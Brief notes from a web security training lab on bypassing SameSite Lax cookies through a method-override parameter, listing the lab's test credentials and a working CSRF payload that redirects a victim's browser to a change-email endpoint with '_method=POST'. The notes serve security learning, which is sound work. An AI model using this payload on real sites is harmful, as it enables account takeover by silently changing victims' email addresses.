Lab #9 - SameSite Lax bypass via method override

Goal - Exploit CSRF to change the victim's email address.

Creds - wiener:peter

Analysis:

<script>
    document.location = "https://0a1200a103990ed481024882008600cc.web-security-academy.net/my-account/change-email?email=test2%40test.ca&_method=POST";
</script>